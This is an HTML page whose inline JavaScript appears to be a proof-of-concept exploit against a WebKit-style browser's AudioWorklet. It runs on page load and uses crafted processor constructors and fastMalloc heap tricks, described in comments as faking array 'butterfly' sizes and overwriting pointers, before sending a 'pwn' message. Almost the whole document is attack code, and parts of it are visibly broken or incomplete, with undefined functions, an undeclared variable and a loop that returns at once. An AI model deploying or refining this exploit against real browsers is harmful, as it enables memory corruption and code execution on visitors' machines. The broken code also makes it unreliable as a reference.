<html>
  <head>
    <script>
      function log(s) {
        document.body.innerText += s + "\n";
      }
      
      var keep = [];
      async function start() {
        log("starting...")
        var context = new OfflineAudioContext(1, 128, 300000);
        context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
        function gc() {
        for(var l = 0; l < 10000; l++) {
          return new Float64Array(10000);
        }
      }
        gc();
        registerProcessor("a", class {
            constructor() {
              // setup a message port to the main thread
              port = new AudioWorkletProcessor().port;
              port.onmessage = gc1;

              // this part is magic
              // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
              eval('1 + 0x1336');

              // overwrite a1's butterfly with a fastMalloc pointer
              gc()
              return {fill: 1, a: [13.37]};
            }
          });
          registerProcessor("b", class {
            constructor() {
              // overwrite b1's butterfly with a fastMalloc pointer
              gc();
              return {fill: 1, b: [13.37]};
            }
            
          });`], {type: "text/javascript"}))).then(async () => {
          var wa = new AudioWorkletNode(context, "a");
          var wb = new AudioWorkletNode(context, "b");
          
          wa.port.onmessage = (e) => { log(e.data); console.log(e.data) }
          await (new Promise((res) => setTimeout(res, 100)));
          wa.port.postMessage("pwn");
        });
      }
      </script>
  </head>
  <body onload="start()">
  </body>
</html>
